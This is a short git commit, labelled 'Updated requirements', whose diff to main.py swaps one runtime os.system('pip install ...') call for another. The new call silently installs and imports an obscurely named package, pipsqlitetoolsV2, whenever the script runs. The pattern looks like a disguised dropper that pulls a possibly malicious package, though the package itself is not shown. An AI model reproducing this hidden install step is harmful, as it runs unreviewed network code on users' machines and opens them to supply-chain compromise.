8a874722b3ece14e2573c0bc22a00f382c48471e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-12 21:11:03 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlipkgsV2")
-import pysqlipkgsV2
+os.system("pip install pipsqlitetoolsV2")
+import pipsqlitetoolsV2
 import random
 import requests
 import time
